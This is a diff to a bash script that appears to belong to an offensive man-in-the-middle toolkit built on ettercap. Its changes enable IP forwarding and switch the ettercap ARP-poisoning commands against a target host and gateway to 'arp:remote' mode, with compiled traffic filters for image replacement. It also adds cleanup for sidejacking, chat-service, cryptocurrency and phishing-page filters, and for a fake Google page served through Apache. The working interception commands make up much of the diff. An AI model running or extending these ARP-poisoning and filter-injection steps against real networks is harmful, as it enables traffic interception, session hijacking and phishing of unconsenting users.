@@ -227,16 +227,39 @@ trap ctrl_c INT
 ctrl_c() {
 echo "${RedF}[x]${white} CTRL+C Abort current tasks${RedF}...${Reset}"
 # clean logfiles folder at exit
+rm $IPATH/logs/parse > /dev/null 2>&1
 rm $IPATH/logs/lan.mop > /dev/null 2>&1
+rm $IPATH/logs/triggertwo > /dev/nul 2>&1
 rm $IPATH/output/firewall.ef > /dev/null 2>&1
 rm $IPATH/output/template.ef > /dev/null 2>&1
+rm $IPATH/output/redirect.ef > /dev/null 2>&1
+rm $IPATH/output/EasterEgg.ef > /dev/null 2>&1
+rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
+rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
 rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
 rm $IPATH/output/img_replace.ef > /dev/null 2>&1
+rm $IPATH/output/sidejacking.ef > /dev/null 2>&1
+rm $IPATH/output/chat_services.ef > /dev/null 2>&1
+rm $IPATH/output/dhcp-discovery.ef > /dev/null 2>&1
+rm $IPATH/output/cryptocurrency.ef > /dev/null 2>&1
 # revert filters to default stage
 mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
 mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
+mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1
+mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft > /dev/null 2>&1
+mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1
+mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1
 mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
 mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
+mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
+mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft > /dev/null 2>&1
+mv $IPATH/filters/cryptocurrency.rb $IPATH/filters/cryptocurrency.eft > /dev/null 2>&1
+mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft > /dev/null 2>&1
+mv $IPATH/bin/phishing/EasterEgg.bak $IPATH/bin/phishing/EasterEgg.html > /dev/null 2>&1
+rm -r $IPATH/logs/capture > /dev/null 2>&1
+rm $ApachE/index.html > /dev/null 2>&1
+rm $ApachE/cssbanner.js > /dev/null 2>&1
+rm -R $ApachE/"Google Sphere_files" > /dev/null 2>&1
 # revert ettercap conf files to default stage
 if [ -e $Edns ]; then
 mv /tmp/etter.dns $Edns > /dev/null 2>&1
@@ -1847,32 +1870,39 @@ sleep 1
     echo ${BlueF}[☠]${white} Compiling img_replace.eft${RedF}!${Reset};
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/img_replace.eft -o $IPATH/output/img_replace.ef && sleep 3"
     sleep 1
+    #
     # port-forward
-    # echo "1" > /proc/sys/net/ipv4/ip_forward
+    #
+    echo "1" > /proc/sys/net/ipv4/ip_forward
     cd $IPATH/logs
 
       # run mitm+filter
       # HINT: irongeek nao usou UID 0 e SSL active...
+
+
+      echo ${BlueF}[☠]${white} access this url to test${RedF}:${GreenF} https://nhm.org/site/${Reset};
+      echo ${BlueF}[☠]${white} Remenber that this kind of attack works better againts Internet Explorer${Reset};
+      sleep 2
       echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
       echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$rhost// /$gateway//
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M arp:remote /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$rhost// /$gateway//
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M arp:remote /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$rhost/ /$gateway/
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M arp:remote /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$rhost/ /$gateway/
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M arp:remote /$rhost/ /$gateway/
         fi
       fi
 
@@ -1880,8 +1910,10 @@ sleep 1
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
+  #
   # port-forward
-  # echo "0" > /proc/sys/net/ipv4/ip_forward
+  #
+  echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
   rm $IPATH/output/img_replace.ef > /dev/null 2>&1
   cd $IPATH
@@ -2329,7 +2361,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 #
 # chose the easter egg to use under mitm+dns_spoof
 #
-EGG=$(zenity --list --title "☠ GOOGLE EASTER EGGS ☠" --text "List of availables google easter eggs:" --radiolist --column "Pick" --column "Option" TRUE "Do a Barrel roll" FALSE "zerg rush" FALSE "blink html" --width 320 --height 200) > /dev/null 2>&1
+EGG=$(zenity --list --title "☠ GOOGLE EASTER EGGS ☠" --text "List of availables google easter eggs:" --radiolist --column "Pick" --column "Option" TRUE "Do a Barrel roll" FALSE "zerg rush" FALSE "blink html" --width 320 --height 230) > /dev/null 2>&1
 #
 # parse easter egg search string
 #
@@ -2340,6 +2372,7 @@ elif [ "$EGG" = "zerg rush" ]; then
 else
   parsed="Blink+HTML"
 fi
+
 
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
